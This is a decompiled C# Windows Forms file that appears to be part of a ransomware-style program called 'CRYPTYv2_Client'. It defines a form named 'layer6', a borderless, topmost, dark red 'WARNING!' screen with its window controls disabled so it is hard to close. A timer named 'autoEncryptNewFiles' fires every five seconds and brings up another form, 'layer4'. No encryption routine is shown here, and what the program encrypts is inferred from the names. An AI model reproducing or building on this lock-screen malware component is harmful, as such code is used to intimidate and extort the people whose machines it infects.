using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using CRYPTYv2_Client.My;
using Microsoft.VisualBasic.CompilerServices;

namespace CRYPTYv2_Client;

[DesignerGenerated]
public class layer6 : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Title")]
	internal virtual Label Title
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer autoEncryptNewFiles
	{
		[CompilerGenerated]
		get
		{
			return _autoEncryptNewFiles;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = autoEncryptNewFiles_Tick;
			Timer val = _autoEncryptNewFiles;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_autoEncryptNewFiles = value;
			val = _autoEncryptNewFiles;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	public layer6()
	{
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Expected O, but got Unknown
		components = new Container();
		Title = new Label();
		autoEncryptNewFiles = new Timer(components);
		((Control)this).SuspendLayout();
		Title.set_AutoSize(true);
		((Control)Title).set_Font(new Font("Consolas", 48f, (FontStyle)4, (GraphicsUnit)3, (byte)0));
		((Control)Title).set_Location(new Point(164, 9));
		((Control)Title).set_Name("Title");
		((Control)Title).set_Size(new Size(312, 75));
		((Control)Title).set_TabIndex(0);
		Title.set_Text("WARNING!");
		autoEncryptNewFiles.set_Enabled(true);
		autoEncryptNewFiles.set_Interval(5000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.DarkRed);
		((Form)this).set_ClientSize(new Size(649, 379));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Title);
		((Control)this).set_Cursor(Cursors.get_No());
		((Control)this).set_Enabled(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("layer6");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("L6");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void autoEncryptNewFiles_Tick(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.layer4).Show();
	}
}
